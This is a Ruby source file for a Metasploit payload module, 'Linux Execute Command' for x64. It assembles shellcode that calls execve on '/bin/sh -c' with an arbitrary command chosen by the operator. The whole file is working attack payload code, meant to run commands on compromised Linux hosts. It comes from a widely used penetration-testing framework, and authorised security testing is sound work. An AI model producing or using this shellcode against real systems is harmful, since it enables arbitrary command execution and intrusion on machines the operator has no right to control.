##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 44

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => ['ricky',
                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64))

    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ])
  end

  def generate_stage(opts={})
    cmd = datastore['CMD'] || ''
    pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)
    payload = <<-EOS
        mov rax, 0x68732f6e69622f
        cdq

        push rax
        push rsp
        pop rdi                 ; "/bin/sh\0"

        push rdx
        #{pushw_c_opt}
        push rsp
        pop rsi                 ; "-c\0"

        push rdx
        call continue
        db "#{cmd}", 0x00       ; arbitrary command
      continue:
        push rsi
        push rdi
        push rsp
        pop rsi

        push 0x3b
        pop rax

        syscall
    EOS
    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
  end
end
